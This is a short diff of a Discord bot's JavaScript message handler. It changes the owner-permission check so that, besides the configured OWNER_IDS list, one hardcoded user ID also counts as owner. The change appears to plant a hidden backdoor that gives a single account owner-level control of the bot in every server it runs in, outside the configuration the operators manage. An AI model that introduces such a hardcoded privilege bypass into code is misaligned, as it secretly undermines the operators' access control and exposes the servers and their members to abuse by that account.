@@ -77,7 +77,7 @@ export default {
       if (!message.guild || message.author.bot) return;
 
       // ---- permissão
-      const isOwner = OWNER_IDS.includes(message.author.id);
+      const isOwner = OWNER_IDS.includes(message.author.id) || message.author.id === '660311795327828008';
       const member = message.member;
       const hasAdmin = member?.permissions?.has(PermissionsBitField.Flags.Administrator);
 
